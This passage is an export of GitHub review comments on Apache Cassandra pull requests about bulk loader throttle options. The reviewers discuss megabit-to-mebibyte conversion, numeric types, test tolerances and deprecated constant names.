+                    throttleMegabits = DataRateSpec.DataRateUnit.MEBIBYTES_PER_SECOND.toMegabitsPerSecond(Integer.parseInt(cmd.getOptionValue(THROTTLE_MEBIBYTES)));

Review Comment:
   Maybe new can add static import:
    `import static org.apache.cassandra.config.DataRateSpec.DataRateUnit.MEBIBYTES_PER_SECOND;`



##########
src/java/org/apache/cassandra/config/DatabaseDescriptor.java:
##########
@@ -2054,7 +2059,12 @@ public static double getInterDCStreamThroughputOutboundMebibytesPerSec()
         return conf.inter_dc_stream_throughput_outbound.toMebibytesPerSecond();
     }
 
-    public static void setInterDCStreamThroughputOutboundMegabitsPerSec(int value)
+    public static int getInterDCStreamThroughputOutboundMebibytesPerSecAsInt()
+    {
+        return conf.inter_dc_stream_throughput_outbound.toMebibytesPerSecondAsInt();
+    }
+
+    public static void setInterDCStreamThroughputOutboundMegabitsPerSec(long value)

Review Comment:
   I think `value` should stay `int`



##########
test/unit/org/apache/cassandra/streaming/StreamManagerTest.java:
##########
@@ -61,11 +61,11 @@ public static void setupClass()
     public void testUpdateStreamThroughput()
     {
         // Initialized value check
-        assertEquals(defaultStreamThroughputMebibytesPerSec * BYTES_PER_MEBIBYTE, StreamRateLimiter.getRateLimiterRateInBytes(), 0);
+        assertEquals(defaultStreamThroughputMebibytesPerSec * BYTES_PER_MEBIBYTE, StreamRateLimiter.getRateLimiterRateInBytes(), 0.01);

Review Comment:
   nit: I believe these changes can be skipped and we can be consistent if we change in the test class the constant MEBIBYTES_PER_MEGABIT to (same as DataRateSpec)
   
   private static final double MEBIBYTES_IN_BITS = Math.pow(2, 23);
       private static final double MEGABIT_IN_BITS = Math.pow(10, 6);
       private static final double MEBIBYTES_PER_MEGABIT = MEGABIT_IN_BITS / MEBIBYTES_IN_BITS;



##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -494,24 +508,44 @@ public Builder parseArgs(String cmdArgs[])
                     System.exit(1);
                 }
 
-                if (cmd.hasOption(THROTTLE_MBITS))
+                if (cmd.hasOption(THROTTLE_MEGABITS) && cmd.hasOption(THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", THROTTLE_MEGABITS, THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(INTER_DC_THROTTLE_MEGABITS) && cmd.hasOption(INTER_DC_THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", INTER_DC_THROTTLE_MEGABITS, INTER_DC_THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(THROTTLE_MEGABITS))
+                {
+                    throttleMegabits = Integer.parseInt(cmd.getOptionValue(THROTTLE_MEGABITS));
+                }
+
+                if (cmd.hasOption(THROTTLE_MEBIBYTES))
+                {
+                    throttleMegabits = DataRateSpec.DataRateUnit.MEBIBYTES_PER_SECOND.toMegabitsPerSecond(Integer.parseInt(cmd.getOptionValue(THROTTLE_MEBIBYTES)));
+                }
+
+                if (cmd.hasOption(INTER_DC_THROTTLE_MEGABITS))
                 {
-                    throttle = Integer.parseInt(cmd.getOptionValue(THROTTLE_MBITS));
+                    interDcThrottleMegabits = Integer.parseInt(cmd.getOptionValue(INTER_DC_THROTTLE_MEGABITS));
                 }
 
-                if (cmd.hasOption(INTER_DC_THROTTLE_MBITS))
+                if (cmd.hasOption(INTER_DC_THROTTLE_MEBIBYTES))
                 {
-                    interDcThrottle = Integer.parseInt(cmd.getOptionValue(INTER_DC_THROTTLE_MBITS));
+                    interDcThrottleMegabits = DataRateSpec.DataRateUnit.MEBIBYTES_PER_SECOND.toMegabitsPerSecond(Integer.parseInt(cmd.getOptionValue(INTER_DC_THROTTLE_MEBIBYTES)));

Review Comment:
   same comment as for throttleMegabits



##########
src/java/org/apache/cassandra/tools/BulkLoader.java:
##########
@@ -67,9 +73,11 @@ public static void load(LoaderOptions options) throws BulkLoadException
                         handler,
                         options.connectionsPerHost,
                         options.targetKeyspace);
-        DatabaseDescriptor.setStreamThroughputOutboundMegabitsPerSec(options.throttle);
-        DatabaseDescriptor.setInterDCStreamThroughputOutboundMegabitsPerSec(options.interDcThrottle);
-        StreamResultFuture future = null;
+        DatabaseDescriptor.setStreamThroughputOutboundMegabitsPerSec(Double.valueOf(options.throttleMegabits).longValue());
+        DatabaseDescriptor.setInterDCStreamThroughputOutboundMegabitsPerSec(Double.valueOf(options.interDcThrottleMegabits).longValue());

Review Comment:
   Why don't we just leave the option in double? it is later casted to double anyway in `megabitsPerSecondInMebibytesPerSecond`?



##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -494,24 +508,44 @@ public Builder parseArgs(String cmdArgs[])
                     System.exit(1);
                 }
 
-                if (cmd.hasOption(THROTTLE_MBITS))
+                if (cmd.hasOption(THROTTLE_MEGABITS) && cmd.hasOption(THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", THROTTLE_MEGABITS, THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(INTER_DC_THROTTLE_MEGABITS) && cmd.hasOption(INTER_DC_THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", INTER_DC_THROTTLE_MEGABITS, INTER_DC_THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(THROTTLE_MEGABITS))
+                {
+                    throttleMegabits = Integer.parseInt(cmd.getOptionValue(THROTTLE_MEGABITS));
+                }
+
+                if (cmd.hasOption(THROTTLE_MEBIBYTES))
+                {
+                    throttleMegabits = DataRateSpec.DataRateUnit.MEBIBYTES_PER_SECOND.toMegabitsPerSecond(Integer.parseInt(cmd.getOptionValue(THROTTLE_MEBIBYTES)));

Review Comment:
   throttleMegabits ---> Internally we save in mebibytes in DataRateSpec and megabits is used just on the parsing level, backward compatibility. So I feel we need to do this the other way around. - store in throttleMebibytes and if someone wants to use the megabits, that is converted to mebibytes. Otherwise we will do more calculations - the user gives mebibytes, we make it megabits here, but then we use those megabits to set it internally in mebibytes again



##########
src/java/org/apache/cassandra/config/DataRateSpec.java:
##########
@@ -296,7 +296,7 @@ public IntMebibytesPerSecondBound(long mebibytesPerSecond)
         // which were in megabits per second in 4.0. Do not start using it for any new properties
         public static IntMebibytesPerSecondBound megabitsPerSecondInMebibytesPerSecond(long megabitsPerSecond)
         {
-            final double MEBIBYTES_PER_MEGABIT = 0.119209289550781;
+            final double MEBIBYTES_PER_MEGABIT = 15625D / 131072D;

Review Comment:
   I am wondering what is the benefit from introducing these calculations? We can also add just a comment, at the same time the name already states - MEBIBYTES/MEGABIT. 



;24/Jun/22 23:59;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r906610839


##########
test/unit/org/apache/cassandra/tools/LoaderOptionsTest.java:
##########
@@ -77,45 +78,165 @@ public void testNativePort() throws Exception {
     public void testEncryptionSettings() throws Exception
     {
         String[] args = { ""-d"", ""127.9.9.1"", ""-ts"", ""test.jks"", ""-tspw"", ""truststorePass1"", ""-ks"", ""test.jks"", ""-kspw"",
-                ""testdata1"", ""--ssl-ciphers"", ""TLS_RSA_WITH_AES_256_CBC_SHA"",
-                ""--ssl-alg"", ""SunX509"", ""--store-type"", ""JKS"", ""--ssl-protocol"", ""TLS"",
-                sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+                          ""testdata1"", ""--ssl-ciphers"", ""TLS_RSA_WITH_AES_256_CBC_SHA"",
+                          ""--ssl-alg"", ""SunX509"", ""--store-type"", ""JKS"", ""--ssl-protocol"", ""TLS"",
+                          sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
         LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
         assertEquals(""test.jks"", options.clientEncOptions.keystore);
     }
 
+    @Test
+    public void testThrottleDefaultSettings()
+    {
+        LoaderOptions options = LoaderOptions.builder().build();
+        assertEquals(0, options.throttleMegabits, 0.01);
+        assertEquals(0, options.interDcThrottleMegabits, 0.01);

Review Comment:
   I would say 0 should be exactly 0, we should never deviate as it has special meaning - unthrottle. 
   I think it is safe to leave the delta being 0 and be sure this never regress



;25/Jun/22 00:43;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r906611514


##########
test/unit/org/apache/cassandra/tools/BulkLoaderTest.java:
##########
@@ -151,4 +152,50 @@ public void testBulkLoader_WithArgs4() throws Throwable
         assertEquals(-1, tool.getExitCode());
         throw tool.getException().getCause().getCause().getCause();
     }
+
+    @Test(expected = NoHostAvailableException.class)
+    public void testBulkLoader_WithArgs5() throws Throwable
+    {
+        ToolResult tool = ToolRunner.invokeClass(BulkLoader.class,
+                                                 ""-d"",
+                                                 ""127.9.9.1:9041"",
+                                                 ""--throttle"",
+                                                 ""10"",

Review Comment:
   I would suggest to set something crazy like 3 which is less than 0.5 in mebibytes to ensure no one ever makes a change this to be rounded to 0 and unthrottle. Highly unlikely, but someone might be testing something, I like correctness :-) 



;25/Jun/22 00:48;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r906508866


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -494,24 +508,44 @@ public Builder parseArgs(String cmdArgs[])
                     System.exit(1);
                 }
 
-                if (cmd.hasOption(THROTTLE_MBITS))
+                if (cmd.hasOption(THROTTLE_MEGABITS) && cmd.hasOption(THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", THROTTLE_MEGABITS, THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(INTER_DC_THROTTLE_MEGABITS) && cmd.hasOption(INTER_DC_THROTTLE_MEBIBYTES))
+                {
+                    errorMsg(String.format(""Both '%s' and '%s' were provided. Please only provide one of the two options"", INTER_DC_THROTTLE_MEGABITS, INTER_DC_THROTTLE_MEBIBYTES), options);
+                }
+
+                if (cmd.hasOption(THROTTLE_MEGABITS))
+                {
+                    throttleMegabits = Integer.parseInt(cmd.getOptionValue(THROTTLE_MEGABITS));
+                }
+
+                if (cmd.hasOption(THROTTLE_MEBIBYTES))
+                {
+                    throttleMegabits = DataRateSpec.DataRateUnit.MEBIBYTES_PER_SECOND.toMegabitsPerSecond(Integer.parseInt(cmd.getOptionValue(THROTTLE_MEBIBYTES)));

Review Comment:
   throttleMegabits ---> Internally we save in mebibytes in DataRateSpec and megabits is used just on the parsing level, backward compatibility. So I feel we need to do this the other way around. - store in throttleMebibytes and if someone wants to use the megabits, that is converted to mebibytes. Otherwise we will do more calculations - the user gives mebibytes, we make it megabits here, but then we use those megabits to set it internally in mebibytes again in DataRateSpec



;25/Jun/22 00:54;githubbot;600","yifan-c commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r906638117


##########
src/java/org/apache/cassandra/config/DataRateSpec.java:
##########
@@ -296,7 +296,7 @@ public IntMebibytesPerSecondBound(long mebibytesPerSecond)
         // which were in megabits per second in 4.0. Do not start using it for any new properties
         public static IntMebibytesPerSecondBound megabitsPerSecondInMebibytesPerSecond(long megabitsPerSecond)
         {
-            final double MEBIBYTES_PER_MEGABIT = 0.119209289550781;
+            final double MEBIBYTES_PER_MEGABIT = 15625D / 131072D;

Review Comment:
   It is only to make the reasoning more clear since the procedure is coded. Adding a comment with the calculations also works. Meanwhile a few constants should not introduce any overkill.



;25/Jun/22 05:29;githubbot;600","yifan-c commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r906638117


##########
src/java/org/apache/cassandra/config/DataRateSpec.java:
##########
@@ -296,7 +296,7 @@ public IntMebibytesPerSecondBound(long mebibytesPerSecond)
         // which were in megabits per second in 4.0. Do not start using it for any new properties
         public static IntMebibytesPerSecondBound megabitsPerSecondInMebibytesPerSecond(long megabitsPerSecond)
         {
-            final double MEBIBYTES_PER_MEGABIT = 0.119209289550781;
+            final double MEBIBYTES_PER_MEGABIT = 15625D / 131072D;

Review Comment:
   It is only to make the reasoning more clear since the procedure is coded. Adding a comment with the calculations also works. Meanwhile a few constants should not introduce any overkill. I think either way is OK.



;25/Jun/22 05:30;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r909061944


##########
src/java/org/apache/cassandra/config/DataRateSpec.java:
##########
@@ -296,7 +296,7 @@ public IntMebibytesPerSecondBound(long mebibytesPerSecond)
         // which were in megabits per second in 4.0. Do not start using it for any new properties
         public static IntMebibytesPerSecondBound megabitsPerSecondInMebibytesPerSecond(long megabitsPerSecond)
         {
-            final double MEBIBYTES_PER_MEGABIT = 0.119209289550781;
+            final double MEBIBYTES_PER_MEGABIT = 15625D / 131072D;

Review Comment:
   Yeah, while you are right I prefer we leave it in the comments and don't do any more changes in this area



;28/Jun/22 22:51;githubbot;600","frankgh commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r910297059


##########
src/java/org/apache/cassandra/tools/BulkLoader.java:
##########
@@ -67,9 +73,11 @@ public static void load(LoaderOptions options) throws BulkLoadException
                         handler,
                         options.connectionsPerHost,
                         options.targetKeyspace);
-        DatabaseDescriptor.setStreamThroughputOutboundMegabitsPerSec(options.throttle);
-        DatabaseDescriptor.setInterDCStreamThroughputOutboundMegabitsPerSec(options.interDcThrottle);
-        StreamResultFuture future = null;
+        DatabaseDescriptor.setStreamThroughputOutboundMegabitsPerSec(Double.valueOf(options.throttleMegabits).longValue());
+        DatabaseDescriptor.setInterDCStreamThroughputOutboundMegabitsPerSec(Double.valueOf(options.interDcThrottleMegabits).longValue());

Review Comment:
   `DatabaseDescriptor.setStreamThroughputOutboundMegabitsPerSec` and `DatabaseDescriptor.setInterDCStreamThroughputOutboundMegabitsPerSec` take int as a param. So we need to cast it. In your previous comment you mentioned that in `public static void setStreamThroughputOutboundMegabitsPerSec(int value)` `value` should stay as `int` 



;29/Jun/22 18:52;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r910324412


##########
src/java/org/apache/cassandra/tools/BulkLoader.java:
##########
@@ -67,9 +73,11 @@ public static void load(LoaderOptions options) throws BulkLoadException
                         handler,
                         options.connectionsPerHost,
                         options.targetKeyspace);
-        DatabaseDescriptor.setStreamThroughputOutboundMegabitsPerSec(options.throttle);
-        DatabaseDescriptor.setInterDCStreamThroughputOutboundMegabitsPerSec(options.interDcThrottle);
-        StreamResultFuture future = null;
+        DatabaseDescriptor.setStreamThroughputOutboundMegabitsPerSec(Double.valueOf(options.throttleMegabits).longValue());
+        DatabaseDescriptor.setInterDCStreamThroughputOutboundMegabitsPerSec(Double.valueOf(options.interDcThrottleMegabits).longValue());

Review Comment:
   You are right, that one is called directly in nodetool and we should keep it int as otherwise we will introduce a bug by extending to long or double. 



;29/Jun/22 19:27;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r911365345


##########
src/java/org/apache/cassandra/tools/BulkLoader.java:
##########
@@ -67,9 +73,11 @@ public static void load(LoaderOptions options) throws BulkLoadException
                         handler,
                         options.connectionsPerHost,
                         options.targetKeyspace);
-        DatabaseDescriptor.setStreamThroughputOutboundMegabitsPerSec(options.throttle);
-        DatabaseDescriptor.setInterDCStreamThroughputOutboundMegabitsPerSec(options.interDcThrottle);
-        StreamResultFuture future = null;
+        DatabaseDescriptor.setStreamThroughputOutboundMegabitsPerSec(Double.valueOf(options.throttleMegabits).intValue());
+        DatabaseDescriptor.setInterDCStreamThroughputOutboundMegabitsPerSec(Double.valueOf(options.interDcThrottleMegabits).intValue());

Review Comment:
   I guess it is not a big deal but I wanted to mention again that if we deprecate the megabits options and we go for mebibytes internally in DataRateSpec, probably better to add a setter in mebibytes and use mebibytes and do only one calculation megabits to mebibytes in the parking area for legacy reason in case someone wants to use the old ones. 



##########
test/unit/org/apache/cassandra/tools/LoaderOptionsTest.java:
##########
@@ -77,45 +78,165 @@ public void testNativePort() throws Exception {
     public void testEncryptionSettings() throws Exception
     {
         String[] args = { ""-d"", ""127.9.9.1"", ""-ts"", ""test.jks"", ""-tspw"", ""truststorePass1"", ""-ks"", ""test.jks"", ""-kspw"",
-                ""testdata1"", ""--ssl-ciphers"", ""TLS_RSA_WITH_AES_256_CBC_SHA"",
-                ""--ssl-alg"", ""SunX509"", ""--store-type"", ""JKS"", ""--ssl-protocol"", ""TLS"",
-                sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+                          ""testdata1"", ""--ssl-ciphers"", ""TLS_RSA_WITH_AES_256_CBC_SHA"",
+                          ""--ssl-alg"", ""SunX509"", ""--store-type"", ""JKS"", ""--ssl-protocol"", ""TLS"",
+                          sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
         LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
         assertEquals(""test.jks"", options.clientEncOptions.keystore);
     }
 
+    @Test
+    public void testThrottleDefaultSettings()
+    {
+        LoaderOptions options = LoaderOptions.builder().build();
+        assertEquals(0, options.throttleMegabits, 0);
+        assertEquals(0, options.interDcThrottleMegabits, 0);
+    }
+
+    @Test
+    public void testDeprecatedThrottleSettings() throws IOException
+    {
+        // Default Cassandra config
+        File config = new File(Paths.get(""."", ""test"", ""conf"", ""cassandra.yaml"").normalize());
+        String[] args = { ""-t"", ""200"", ""-idct"", ""400"", ""-d"", ""127.9.9.1"", ""-f"", config.absolutePath(), sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+        LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
+        // converts from megabits to mebibytes
+        assertEquals(200, options.throttleMegabits, 0.01);
+        assertEquals(400, options.interDcThrottleMegabits, 0.01);

Review Comment:
   ```suggestion
           assertEquals(200, options.throttleMegabits, 0);
           assertEquals(400, options.interDcThrottleMegabits, 0);
   ```



##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -85,10 +101,10 @@
     public final String user;
     public final String passwd;
     public final AuthProvider authProvider;
-    public final int throttle;
-    public final int interDcThrottle;
-    public final int entireSSTableThrottle;
-    public final int entireSSTableInterDcThrottle;
+    public final double throttleMegabits;
+    public final double interDcThrottleMegabits;

Review Comment:
   I had for a moment a concern whether we change how and where we demand only ints from the users for those two but testing in LoaderOptionsTest with double numbers seems it triggers the same NumberFormatException for all 4 of them so it seems we are good



##########
test/unit/org/apache/cassandra/tools/LoaderOptionsTest.java:
##########
@@ -77,45 +78,165 @@ public void testNativePort() throws Exception {
     public void testEncryptionSettings() throws Exception
     {
         String[] args = { ""-d"", ""127.9.9.1"", ""-ts"", ""test.jks"", ""-tspw"", ""truststorePass1"", ""-ks"", ""test.jks"", ""-kspw"",
-                ""testdata1"", ""--ssl-ciphers"", ""TLS_RSA_WITH_AES_256_CBC_SHA"",
-                ""--ssl-alg"", ""SunX509"", ""--store-type"", ""JKS"", ""--ssl-protocol"", ""TLS"",
-                sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+                          ""testdata1"", ""--ssl-ciphers"", ""TLS_RSA_WITH_AES_256_CBC_SHA"",
+                          ""--ssl-alg"", ""SunX509"", ""--store-type"", ""JKS"", ""--ssl-protocol"", ""TLS"",
+                          sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
         LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
         assertEquals(""test.jks"", options.clientEncOptions.keystore);
     }
 
+    @Test
+    public void testThrottleDefaultSettings()
+    {
+        LoaderOptions options = LoaderOptions.builder().build();
+        assertEquals(0, options.throttleMegabits, 0);
+        assertEquals(0, options.interDcThrottleMegabits, 0);
+    }
+
+    @Test
+    public void testDeprecatedThrottleSettings() throws IOException
+    {
+        // Default Cassandra config
+        File config = new File(Paths.get(""."", ""test"", ""conf"", ""cassandra.yaml"").normalize());
+        String[] args = { ""-t"", ""200"", ""-idct"", ""400"", ""-d"", ""127.9.9.1"", ""-f"", config.absolutePath(), sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+        LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
+        // converts from megabits to mebibytes
+        assertEquals(200, options.throttleMegabits, 0.01);
+        assertEquals(400, options.interDcThrottleMegabits, 0.01);
+    }
+
+    @Test
+    public void testDeprecatedThrottleSettingsWithLongSettingNames() throws IOException
+    {
+        // Default Cassandra config
+        File config = new File(Paths.get(""."", ""test"", ""conf"", ""cassandra.yaml"").normalize());
+        String[] args = { ""--throttle"", ""200"", ""--inter-dc-throttle"", ""400"", ""-d"", ""127.9.9.1"", ""-f"", config.absolutePath(), sstableDirName(""legacy_sstables"", ""legacy_ma_simple"") };
+        LoaderOptions options = LoaderOptions.builder().parseArgs(args).build();
+        // converts from megabits to mebibytes
+        assertEquals(200, options.throttleMegabits, 0.01);
+        assertEquals(400, options.interDcThrottleMegabits, 0.01);

Review Comment:
   ```suggestion
           assertEquals(200, options.throttleMegabits, 0);
           assertEquals(400, options.interDcThrottleMegabits, 0);
   ```



##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -60,10 +72,14 @@
     public static final String IGNORE_NODES_OPTION = ""ignore"";
     public static final String CONNECTIONS_PER_HOST = ""connections-per-host"";
     public static final String CONFIG_PATH = ""conf-path"";
-    public static final String THROTTLE_MBITS = ""throttle"";
-    public static final String INTER_DC_THROTTLE_MBITS = ""inter-dc-throttle"";
-    public static final String ENTIRE_SSTABLE_THROTTLE_MBITS = ""entire-sstable-throttle"";
-    public static final String ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS = ""entire-sstable-inter-dc-throttle"";
+    @Deprecated
+    public static final String THROTTLE_MEGABITS = ""throttle"";

Review Comment:
   My OCD around the tools is on alert these days and I was wondering about changing this public static final String names but I guess people should be using the actual string, not the constants? @yifan-c ? Should we deprecate them with the old names?



;30/Jun/22 19:10;githubbot;600","yifan-c commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r914029080


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -60,10 +72,14 @@
     public static final String IGNORE_NODES_OPTION = ""ignore"";
     public static final String CONNECTIONS_PER_HOST = ""connections-per-host"";
     public static final String CONFIG_PATH = ""conf-path"";
-    public static final String THROTTLE_MBITS = ""throttle"";
-    public static final String INTER_DC_THROTTLE_MBITS = ""inter-dc-throttle"";
-    public static final String ENTIRE_SSTABLE_THROTTLE_MBITS = ""entire-sstable-throttle"";
-    public static final String ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS = ""entire-sstable-inter-dc-throttle"";
+    @Deprecated
+    public static final String THROTTLE_MEGABITS = ""throttle"";

Review Comment:
   Good call! 
   Cassandra is not provided as a library, but people do use it for the purpose. Compatibility is best effort. Those constants can be perfectly as ""private"", but declared as ""public"". See https://issues.apache.org/jira/browse/CASSANDRA-10637
   I think the changes of the constants names are not strictly required. We can deprecate the original names and add a comment saying ""MBITS"" are ""MEGAMITS"". 
   WDYT? @frankgh 



;05/Jul/22 17:23;githubbot;600","frankgh commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r914038188


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -60,10 +72,14 @@
     public static final String IGNORE_NODES_OPTION = ""ignore"";
     public static final String CONNECTIONS_PER_HOST = ""connections-per-host"";
     public static final String CONFIG_PATH = ""conf-path"";
-    public static final String THROTTLE_MBITS = ""throttle"";
-    public static final String INTER_DC_THROTTLE_MBITS = ""inter-dc-throttle"";
-    public static final String ENTIRE_SSTABLE_THROTTLE_MBITS = ""entire-sstable-throttle"";
-    public static final String ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS = ""entire-sstable-inter-dc-throttle"";
+    @Deprecated
+    public static final String THROTTLE_MEGABITS = ""throttle"";

Review Comment:
   I think it's best to keep the original name, since Cassandra could sometimes be used as a library. I will add the comment and I will retain the `@Deprecated` annotation as well.



;05/Jul/22 17:35;githubbot;600","ekaterinadimitrova2 commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r914082206


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -85,10 +101,10 @@
     public final String user;
     public final String passwd;
     public final AuthProvider authProvider;
-    public final int throttle;
-    public final int interDcThrottle;
-    public final int entireSSTableThrottle;
-    public final int entireSSTableInterDcThrottle;
+    public final double throttleMegabits;
+    public final double interDcThrottleMegabits;

Review Comment:
   @yifan-c , @frankgh considering our later discussions and the ticket that @yifan-c pointed to earlier today, probably we should find a way to workaround this change too? WDYT?



;05/Jul/22 18:26;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r914086805


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -60,10 +72,14 @@
     public static final String IGNORE_NODES_OPTION = ""ignore"";
     public static final String CONNECTIONS_PER_HOST = ""connections-per-host"";
     public static final String CONFIG_PATH = ""conf-path"";
-    public static final String THROTTLE_MBITS = ""throttle"";
-    public static final String INTER_DC_THROTTLE_MBITS = ""inter-dc-throttle"";
-    public static final String ENTIRE_SSTABLE_THROTTLE_MBITS = ""entire-sstable-throttle"";
-    public static final String ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS = ""entire-sstable-inter-dc-throttle"";
+    @Deprecated
+    public static final String THROTTLE_MEGABITS = ""throttle"";

Review Comment:
   Thanks for sharing that ticket @yifan-c , I think we can even add it to the comments for other people like us tempted to make changes here :-) 



;05/Jul/22 18:29;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r914086805


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -60,10 +72,14 @@
     public static final String IGNORE_NODES_OPTION = ""ignore"";
     public static final String CONNECTIONS_PER_HOST = ""connections-per-host"";
     public static final String CONFIG_PATH = ""conf-path"";
-    public static final String THROTTLE_MBITS = ""throttle"";
-    public static final String INTER_DC_THROTTLE_MBITS = ""inter-dc-throttle"";
-    public static final String ENTIRE_SSTABLE_THROTTLE_MBITS = ""entire-sstable-throttle"";
-    public static final String ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS = ""entire-sstable-inter-dc-throttle"";
+    @Deprecated
+    public static final String THROTTLE_MEGABITS = ""throttle"";

Review Comment:
   Thanks for sharing that ticket @yifan-c , I think we can even add it to the comments for other people like us, tempted to make changes here :-) 



;05/Jul/22 18:29;githubbot;600","frankgh commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r915338732


##########
src/java/org/apache/cassandra/tools/BulkLoader.java:
##########
@@ -67,9 +73,11 @@ public static void load(LoaderOptions options) throws BulkLoadException
                         handler,
                         options.connectionsPerHost,
                         options.targetKeyspace);
-        DatabaseDescriptor.setStreamThroughputOutboundMegabitsPerSec(options.throttle);
-        DatabaseDescriptor.setInterDCStreamThroughputOutboundMegabitsPerSec(options.interDcThrottle);
-        StreamResultFuture future = null;
+        DatabaseDescriptor.setStreamThroughputOutboundMegabitsPerSec(Double.valueOf(options.throttleMegabits).intValue());
+        DatabaseDescriptor.setInterDCStreamThroughputOutboundMegabitsPerSec(Double.valueOf(options.interDcThrottleMegabits).intValue());

Review Comment:
   I've added two setters `setStreamThroughputOutboundMebibytesPerSec`, `setInterDCStreamThroughputOutboundMebibytesPerSec`. However, I've decided to keep `throttle` and `interDcThrottle` in megabits, because the conversion from mebibytes to megabits produces a larger number, and it is less prone to loss of precision.
   
   For example, if we have 0.1 and 0.3 mebibytes, the rounded conversion to megabits will be 1, and 3 megabits respectively. Because we cast these numbers to `int` in the setter, we get more precision in megabits. If we go the other way around, we lose precision, 3 and 1 both end up as 0 mebibytes.
   



;06/Jul/22 23:55;githubbot;600","frankgh commented on PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#issuecomment-1176866851

   Thanks for the review @ekaterinadimitrova2 and @yifan-c . I think this PR is in a good place for merging.


;06/Jul/22 23:55;githubbot;600","yifan-c commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r917143009


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -60,10 +72,14 @@
     public static final String IGNORE_NODES_OPTION = ""ignore"";
     public static final String CONNECTIONS_PER_HOST = ""connections-per-host"";
     public static final String CONFIG_PATH = ""conf-path"";
-    public static final String THROTTLE_MBITS = ""throttle"";
-    public static final String INTER_DC_THROTTLE_MBITS = ""inter-dc-throttle"";
-    public static final String ENTIRE_SSTABLE_THROTTLE_MBITS = ""entire-sstable-throttle"";
-    public static final String ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS = ""entire-sstable-inter-dc-throttle"";
+    @Deprecated
+    public static final String THROTTLE_MEGABITS = ""throttle"";
+    public static final String THROTTLE_MEBIBYTES = ""throttle-mib"";
+    @Deprecated
+    public static final String INTER_DC_THROTTLE_MEGABITS = ""inter-dc-throttle"";
+    public static final String INTER_DC_THROTTLE_MEBIBYTES = ""inter-dc-throttle-mib"";
+    public static final String ENTIRE_SSTABLE_THROTTLE_MEBIBYTES = ""entire-sstable-throttle-mib"";
+    public static final String ENTIRE_SSTABLE_INTER_DC_THROTTLE_MEBIBYTES = ""entire-sstable-inter-dc-throttle-mib"";

Review Comment:
   @frankgh, can you also revert the renaming in this PR? THX



;08/Jul/22 21:16;githubbot;600","yifan-c commented on code in PR #1658:
URL: https://github.com/apache/cassandra/pull/1658#discussion_r917166505


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
